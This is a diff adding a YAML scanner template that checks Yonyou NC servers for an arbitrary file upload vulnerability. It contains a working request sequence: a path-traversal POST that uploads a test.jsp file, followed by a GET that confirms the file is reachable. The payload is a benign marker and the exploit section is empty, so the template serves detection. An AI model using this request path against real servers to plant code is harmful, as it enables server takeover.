@@ -1,0 +1,62 @@
+app: 用友软件
+query: app:"用友软件"
+meta:
+  name: 用友 NC uploadControl/uploadFile 任意文件上传漏洞
+  level: 4
+  tags:
+  - file_upload
+  description: 用友 NC uploadControl/uploadFile 接口存在任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限。
+  homepage: ""
+  author: X prism
+  references: ""
+  solution: 安装补丁、升级至最新版
+  create_at: "2024-07-13 00:48:33"
+  available: false
+  steps:
+    variable: []
+    verify_steps:
+      type: and
+      verify:
+      - request:
+          method: POST
+          path: /mp/initcfg/../uploadControl/uploadFile
+          redirect: true
+          header:
+          - Content-Type: multipart/form-data; boundary=21e783bad5d805d7b2fe3e5ef7de7e6b0ed13740d4679092487968736c4c
+          params: |-
+            --21e783bad5d805d7b2fe3e5ef7de7e6b0ed13740d4679092487968736c4c
+            Content-Disposition: form-data; name="submit"
+
+            上传
+            --21e783bad5d805d7b2fe3e5ef7de7e6b0ed13740d4679092487968736c4c
+            Content-Disposition: form-data; name="file"; filename="test.jsp"
+            Content-Type: text/plain; charset=utf-8
+
+            test
+            --21e783bad5d805d7b2fe3e5ef7de7e6b0ed13740d4679092487968736c4c--
+        response:
+        - name: code
+          value: "200"
+          type: equals
+        - name: body
+          value: '{"forbidden'
+          type: contains
+      - request:
+          method: GET
+          path: /mp/uploadFileDir/test.jsp
+          redirect: true
+          header: []
+          params: ""
+        response:
+        - name: code
+          value: "200"
+          type: equals
+        - name: body
+          value: test
+          type: contains
+    exploit_steps:
+      type: ""
+      params:
+        name: ""
+        type: input
+        value: ""
